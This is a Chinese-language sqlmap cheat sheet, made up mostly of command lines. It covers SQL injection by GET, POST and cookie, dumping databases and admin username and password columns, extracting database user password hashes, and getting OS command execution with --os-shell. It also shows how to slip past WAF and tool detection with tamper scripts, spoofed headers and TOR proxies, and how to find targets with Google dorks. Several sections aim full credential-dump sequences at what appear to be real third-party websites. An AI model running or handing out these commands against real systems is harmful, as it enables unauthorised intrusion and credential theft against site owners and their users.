Sqlmap
======
1. 注入分法不同，种类不同，来个简单的分类：<br/>

        1.get型:        sqlmap -u "http://xxx.xx.xxx/xx.xxx?xx=xxx"
        2.post型:       sqlmap -u "http://xxx.xx.xxx/xx.xxx" --data="xxxx=xxxx&xxxx=xxx"
        3.cookie类注入: sqlmap -u "http://xxx.xx.xxx/xx.xxx?xx=xxx" --cookie="xxx=xxx&xxx=xxx" --level=2

2. 需要数据库

        --dbs
        
3. 得到数据库名称xxx，需要表:

        -D xxx --tables

4. 得到表名xxxx，需要列：

        -D xxx -T xxxx --columns
		
	Note:
        
           1) 指定列的范围从2－4 : python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --dump -T users -D test --start 2 --stop 4 -v 0
			
5. 得到列名有admin，password，需要值：

        -D xxx -T xxxx -C "admin,password" --dump
		
	Note:
        
	1) --dump-all 导出所有表，所有数据
				
6. 还需要绕waf

        python sqlmap.py -u "http://192.168.159.1/news.php?id=1" -v 3 --dbs --batch --tamper "space2morehash.py"
        
        相同的脚本还有：
        
            § space2morehash.py
            § space2hash.py
            § base64encode.py
            § charencode.py
		
		
7. 注入被识别出来是工具，断开咋办

        a. python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --user-agent "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)" -v 3
        b. python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 1 -a "./txt/user-agents.txt"
        c. python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --referer "http://www.google.com" -v 3

8. 让sqlmap自动跑post注入，填表单

        sqlmap -u "http://www.xxx.com/login.asp" --forms

9. 看看当前用户是不是dba

        --is-dba
        -a
		
	Note:
        
        1) -a下面的那些命令是用来看用户，看主机，看权限的
        

10. 列举数据库用户

        python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --users -v 0
        
11. 列举数据库用户密码

        python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --passwords -v 0
        python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --passwords -U sa -v 0
        
12. 查看用户权限

        python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --privileges -v 0
        python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --privileges -U postgres -v 0
        
13. 使用基本认证

        python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass" -v 3

14. 使用Digest认证

        python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/digest/get_int.php?id=1" --auth-type Digest --auth-cred "testuser:testpass" -v 3

15. 使用代理,配合TOR

        a. python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --proxy "http://192.168.1.47:3128"
        b. python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --proxy "http://192.168.1.47:8118"
        
16. 使用多线程猜解

        python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 1 --current-user --threads 3

17. 绕过动态检测,直接指定有注入点的参数

        python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -v 1 -p "id"
        python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/ua_str.php" -v 1 -p "user-agent" --user-agent "sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"

18. 指定数据库,绕过SQLMAP的自动检测

        python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -v 2 --dbms "PostgreSQL"
        * MySQL
        * Oracle
        * PostgreSQL
        * Microsoft SQL Server
        
19. 指定操作系统,绕过SQLMAP自动检测

        python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -v 2 --os "Windows"
        * Linux
        * Windows
        
20. 自定义payload

        Options: --prefix and --suffix
        python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_str_brackets.php?id=1" -v 3 -p "id" --prefix "'" --suffix "AND 'test'='test"

21. --os-xx系列命令，可以执行系统命令，同时还发现了牛逼的xpcmdshell

        ○ sqlmap -u http://192.168.159.1/news.php?id=1 --os-cmd=ipconfig
        ○ sqlmap -u http://192.168.159.1/news.php?id=1 --os-shell
        ○ --file-xx 牛逼的文件操作命令

22. sql query

        a. python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --sql-query "SELECT usename FROM pg_user" -v 0
        b. python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --sql-query "SELECT host, password FROM mysql.user LIMIT 1, 3" -v 1

23. 选择sqlmap默认选项

        --batch 
        
        
24. 不那么常用的

        a. 只列出用户自己新建的数据库和表的内容
                python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --dump-all --exclude-sysdbs -v 0
        b. 保存和恢复会话
                python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b -v 1 -s "sqlmap.log"
        c. 保存选项到INC配置文件
                python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b -v 1 --save
        d. 页面比较
                python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=1" --string "luther" -v 1
                python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=1" --regexp "<td>lu[\w][\w]er" -v
        e. 排除网站的内容
                python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=1" --excl-reg "Dynamic content: ([\d]+)"
        f. 多语句测试，php内嵌函数mysql_query(),不支持多语句
                python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --stacked-test -v 1
        g. union注入测试
                python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --union-test -v 1
        h. unionz注入配合orderby
                python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_str.php?id=1" --union-test --union-tech orderby -v 1
                python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" -v 1 --union-use --banner
                python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 5 --union-use --current-user
                python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_partialunion.php?id=1" -v 1 --union-use --dbs
        i. fingerprint
                python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" -v 1 -f
                python sqlmap.py -u "http://192.168.123.36/sqlmap/get_str.asp?name=luther" -v 1 -f -b
        j. SQLMAP中Google搜索注入
                python sqlmap.py  -g "inurl:php?id="
        k. SQLMAP伪静态注入
                i. 查找数据库
                        python sqlmap.py -u "http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html" --dbs
                ii. 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)
                        python sqlmap.py -u "http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html" -D dataname --tables
                iii. 通过2中的数据表得到字段(假如得到的是tablename表)
                        python sqlmap.py -u "http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html" -D dataname -T tablename --columns
                iv. 通过3得到字段值(假如从3中得到字段id，password)
                        python sqlmap.py -u "http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html" -D dataname -T tablename -C "password" --dump
                        
        l. SQLMAP用于Access数据库注入
                i. 猜解是否能注入
                        python sqlmap.py -u "http://www.stronkin.com/en/CompHonorBig.asp?id=7"
                ii. 猜解表
                        python sqlmap.py -u "http://www.stronkin.com/en/CompHonorBig.asp?id=7" --tables
                iii. 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)
                        python sqlmap.py -u "http://www.stronkin.com/en/CompHonorBig.asp?id=7" --columns -T admin
                iv. 根据字段猜解内容(假如通过3得到字段为username和password)
                        python sqlmap.py -u "http://www.stronkin.com/en/CompHonorBig.asp?id=7" --dump -T admin -C "username,password"
        m. SQLMAP用于Cookie注入
                i. cookie注入，猜解表
                        python sqlmap.py -u "http://www.ntjx.org/jsj/shownews.asp" --cookie "id=31" --table --level 2
                ii. 猜解字段，(通过1的表猜解字段，假如表为admin)
                        python sqlmap.py -u "http://www.ntjx.org/jsj/shownews.asp" --cookie "id=31" --columns -T admin --level 2
                iii. 猜解内容
                        python sqlmap.py -u "http://www.ntjx.org/jsj/shownews.asp" --cookie "id=31" --dump -T admin -C "username,password" --level 2
                        
